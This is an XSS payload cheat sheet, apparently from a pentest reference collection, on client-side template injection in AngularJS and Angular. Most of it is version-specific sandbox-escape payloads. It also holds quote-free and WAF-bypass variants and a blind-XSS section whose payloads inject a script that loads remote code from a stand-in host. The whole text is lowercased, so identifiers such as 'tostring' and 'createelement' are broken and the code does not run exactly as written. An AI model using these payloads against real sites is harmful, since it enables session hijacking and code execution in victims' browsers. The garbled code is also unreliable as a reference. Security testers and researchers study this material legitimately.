# xss in angular and angularjs

## summary

* [client side template injection](#client-side-template-injection)
    * [stored/reflected xss](#storedreflected-xss)
    * [advanced bypassing xss](#advanced-bypassing-xss)
    * [blind xss](#blind-xss)
* [automatic sanitization](#automatic-sanitization)
* [references](#references)


## client side template injection

the following payloads are based on client side template injection.

### stored/reflected xss

`ng-app` directive must be present in a root element to allow the client-side injection (cf. [angularjs: api: ngapp](https://docs.angularjs.org/api/ng/directive/ngapp)).

> angularjs as of version 1.6 have removed the sandbox altogether

angularjs 1.6+ by [mario heiderich](https://twitter.com/cure53berlin)

```javascript
{{constructor.constructor('alert(1)')()}}
```

angularjs 1.6+ by [@brutelogic](https://twitter.com/brutelogic/status/1031534746084491265)

```javascript
{{[].pop.constructor&#40'alert\u00281\u0029'&#41&#40&#41}}
```

example available at [https://brutelogic.com.br/xss.php](https://brutelogic.com.br/xss.php?a=<brute+ng-app>%7b%7b[].pop.constructor%26%2340%27alert%5cu00281%5cu0029%27%26%2341%26%2340%26%2341%7d%7d)

angularjs 1.6.0 by [@lewisardern](https://twitter.com/lewisardern/status/1055887619618471938) & [@garethheyes](https://twitter.com/garethheyes/status/1055884215131213830)

```javascript
{{0[a='constructor'][a]('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
```

angularjs 1.5.9 - 1.5.11 by [jan horn](https://twitter.com/tehjh)

```javascript
{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;
    c.$apply=$apply;c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).tostring;
    c=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    b=c(b,c,b);$evalasync("
    astnode=pop();astnode.type='unaryexpression';
    astnode.operator='(window.x?void0:(window.x=true,alert(1)))+';
    astnode.argument={type:'identifier',name:'foo'};
    ");
    m1=b($$asyncqueue.pop().expression,null,$root);
    m2=b(c,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}
```

angularjs 1.5.0 - 1.5.8

```javascript
{{x = {'y':''.constructor.prototype}; x['y'].charat=[].join;$eval('x=alert(1)');}}
```

angularjs 1.4.0 - 1.4.9

```javascript
{{'a'.constructor.prototype.charat=[].join;$eval('x=1} } };alert(1)//');}}
```

angularjs 1.3.20

```javascript
{{'a'.constructor.prototype.charat=[].join;$eval('x=alert(1)');}}
```

angularjs 1.3.19

```javascript
{{
    'a'[{tostring:false,valueof:[].join,length:1,0:'__proto__'}].charat=[].join;
    $eval('x=alert(1)//');
}}
```

angularjs 1.3.3 - 1.3.18

```javascript
{{{}[{tostring:[].join,length:1,0:'__proto__'}].assign=[].join;
  'a'.constructor.prototype.charat=[].join;
  $eval('x=alert(1)//');  }}
```

angularjs 1.3.1 - 1.3.2

```javascript
{{
    {}[{tostring:[].join,length:1,0:'__proto__'}].assign=[].join;
    'a'.constructor.prototype.charat=''.valueof;
    $eval('x=alert(1)//');
}}
```

angularjs 1.3.0

```javascript
{{!ready && (ready = true) && (
      !call
      ? $$watchers[0].get(tostring.constructor.prototype)
      : (a = apply) &&
        (apply = constructor) &&
        (valueof = call) &&
        (''+''.tostring(
          'f = function.prototype;' +
          'f.apply = f.a;' +
          'delete f.a;' +
          'delete f.valueof;' +
          'alert(1);'
        ))
    );}}
```

angularjs 1.2.24 - 1.2.29

```javascript
{{'a'.constructor.prototype.charat=''.valueof;$eval("x='\"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+\"'");}}
```

angularjs 1.2.19 - 1.2.23

```javascript
{{tostring.constructor.prototype.tostring=tostring.constructor.prototype.call;["a","alert(1)"].sort(tostring.constructor);}}
```

angularjs 1.2.6 - 1.2.18

```javascript
{{(_=''.sub).call.call({}[$='constructor'].getownpropertydescriptor(_.__proto__,$).value,0,'alert(1)')()}}
```

angularjs 1.2.2 - 1.2.5

```javascript
{{'a'[{tostring:[].join,length:1,0:'__proto__'}].charat=''.valueof;$eval("x='"+(y='if(!window\\u002ex)alert(window\\u002ex=1)')+eval(y)+"'");}}
```

angularjs 1.2.0 - 1.2.1

```javascript
{{a='constructor';b={};a.sub.call.call(b[a].getownpropertydescriptor(b[a].getprototypeof(a.sub),a).value,0,'alert(1)')()}}
```

angularjs 1.0.1 - 1.1.5 and vue js

```javascript
{{constructor.constructor('alert(1)')()}}
```

### advanced bypassing xss

angularjs (without `'` single and `"` double quotes) by [@viren](https://twitter.com/virenpawar_)

```javascript
{{x=valueof.name.constructor.fromcharcode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}
```

angularjs (without `'` single and `"` double quotes and `constructor` string)

```javascript
{{x=767015343;y=50986827;a=x.tostring(36)+y.tostring(36);b={};a.sub.call.call(b[a].getownpropertydescriptor(b[a].getprototypeof(a.sub),a).value,0,tostring()[a].fromcharcode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}
```

```javascript
{{x=767015343;y=50986827;a=x.tostring(36)+y.tostring(36);b={};a.sub.call.call(b[a].getownpropertydescriptor(b[a].getprototypeof(a.sub),a).value,0,tostring()[a].fromcodepoint(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}
```

```javascript
{{x=767015343;y=50986827;a=x.tostring(36)+y.tostring(36);a.sub.call.call({}[a].getownpropertydescriptor(a.sub.__proto__,a).value,0,tostring()[a].fromcharcode(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}
```

```javascript
{{x=767015343;y=50986827;a=x.tostring(36)+y.tostring(36);a.sub.call.call({}[a].getownpropertydescriptor(a.sub.__proto__,a).value,0,tostring()[a].fromcodepoint(112,114,111,109,112,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41))()}}
```

angularjs bypass waf [imperva]

```javascript
{{x=['constr', 'uctor'];a=x.join('');b={};a.sub.call.call(b[a].getownpropertydescriptor(b[a].getprototypeof(a.sub),a).value,0,'pr\\u{6f}mpt(d\\u{6f}cument.d\\u{6f}main)')()}}
```

### blind xss

1.0.1 - 1.1.5 && > 1.6.0 by mario heiderich (cure53)

```javascript
{{
    constructor.constructor("var _ = document.createelement('script');
    _.src='//localhost/m';
    document.getelementsbytagname('body')[0].appendchild(_)")()
}}
```


shorter 1.0.1 - 1.1.5 && > 1.6.0 by lewis ardern (synopsys) and gareth heyes (portswigger)

```javascript
{{
    $on.constructor("var _ = document.createelement('script');
    _.src='//localhost/m';
    document.getelementsbytagname('body')[0].appendchild(_)")()
}}
```

1.2.0 - 1.2.5 by gareth heyes (portswigger)

```javascript
{{
    a="a"["constructor"].prototype;a.charat=a.trim;
    $eval('a",eval(`var _=document\\x2ecreateelement(\'script\');
    _\\x2esrc=\'//localhost/m\';
    document\\x2ebody\\x2eappendchild(_);`),"')
}}
```

1.2.6 - 1.2.18 by jan horn (cure53, now works at google project zero)

```javascript
{{
    (_=''.sub).call.call({}[$='constructor'].getownpropertydescriptor(_.__proto__,$).value,0,'eval("
        var _ = document.createelement(\'script\');
        _.src=\'//localhost/m\';
        document.getelementsbytagname(\'body\')[0].appendchild(_)")')()
}}
```

1.2.19 (firefox) by mathias karlsson

```javascript
{{
    tostring.constructor.prototype.tostring=tostring.constructor.prototype.call;
    ["a",'eval("var _ = document.createelement(\'script\');
    _.src=\'//localhost/m\';
    document.getelementsbytagname(\'body\')[0].appendchild(_)")'].sort(tostring.constructor);
}}
```

1.2.20 - 1.2.29 by gareth heyes (portswigger)

```javascript
{{
    a="a"["constructor"].prototype;a.charat=a.trim;
    $eval('a",eval(`
    var _=document\\x2ecreateelement(\'script\');
    _\\x2esrc=\'//localhost/m\';
    document\\x2ebody\\x2eappendchild(_);`),"')
}}
```

1.3.0 - 1.3.9 by gareth heyes (portswigger)

```javascript
{{
    a=tostring().constructor.prototype;a.charat=a.trim;
    $eval('a,eval(`
    var _=document\\x2ecreateelement(\'script\');
    _\\x2esrc=\'//localhost/m\';
    document\\x2ebody\\x2eappendchild(_);`),a')
}}
```

1.4.0 - 1.5.8 by gareth heyes (portswigger)

```javascript
{{
    a=tostring().constructor.prototype;a.charat=a.trim;
    $eval('a,eval(`var _=document.createelement(\'script\');
    _.src=\'//localhost/m\';document.body.appendchild(_);`),a')
}}
```

1.5.9 - 1.5.11 by jan horn (cure53, now works at google project zero)

```javascript
{{
    c=''.sub.call;b=''.sub.bind;a=''.sub.apply;c.$apply=$apply;
    c.$eval=b;op=$root.$$phase;
    $root.$$phase=null;od=$root.$digest;$root.$digest=({}).tostring;
    c=c.$apply(c);$root.$$phase=op;$root.$digest=od;
    b=c(b,c,b);$evalasync("astnode=pop();astnode.type='unaryexpression';astnode.operator='(window.x?void0:(window.x=true,eval(`var _=document.createelement(\\'script\\');_.src=\\'//localhost/m\\';document.body.appendchild(_);`)))+';astnode.argument={type:'identifier',name:'foo'};");
    m1=b($$asyncqueue.pop().expression,null,$root);
    m2=b(c,null,m1);[].push.apply=m2;a=''.sub;
    $eval('a(b.c)');[].push.apply=a;
}}
```

## automatic sanitization

> to systematically block xss bugs, angular treats all values as untrusted by default. when a value is inserted into the dom from a template, via property, attribute, style, class binding, or interpolation, angular sanitizes and escapes untrusted values.

however, it is possible to mark a value as trusted and prevent the automatic sanitization with these methods:

- bypasssecuritytrusthtml
- bypasssecuritytrustscript
- bypasssecuritytruststyle
- bypasssecuritytrusturl
- bypasssecuritytrustresourceurl

example of a component using the unsecure method `bypasssecuritytrusturl`:

```js
import { component, oninit } from '@angular/core';

@component({
  selector: 'my-app',
  template: `
    <h4>an untrusted url:</h4>
    <p><a class="e2e-dangerous-url" [href]="dangerousurl">click me</a></p>
    <h4>a trusted url:</h4>
    <p><a class="e2e-trusted-url" [href]="trustedurl">click me</a></p>
  `,
})
export class app {
  constructor(private sanitizer: domsanitizer) {
    this.dangerousurl = 'javascript:alert("hi there")';
    this.trustedurl = sanitizer.bypasssecuritytrusturl(this.dangerousurl);
  }
}
```


[image extracted text: [image not found]]


when doing a code review, you want to make sure that no user input is being trusted since it will introduce a security vulnerability in the application.


## references

- [angular security - may 16, 2023](https://angular.io/guide/security)
- [bidding like a billionaire - stealing nfts with 4-char cstis - matan berson (@mtnber) - july 11, 2024](https://matanber.com/blog/4-char-csti)
- [blind xss angularjs payloads - lewis ardern - december 7, 2018](http://web.archive.org/web/20181209041100/https://ardern.io/2018/12/07/angularjs-bxss/)
- [bypass domsanitizer - swarna (@swarnakishore) - august 11, 2017](https://medium.com/@swarnakishore/angular-safe-pipe-implementation-to-bypass-domsanitizer-stripping-out-content-c1bf0f1cc36b)
- [xss without html - csti with angular js - gareth heyes (@garethheyes) - january 27, 2016](https://portswigger.net/blog/xss-without-html-client-side-template-injection-with-angularjs)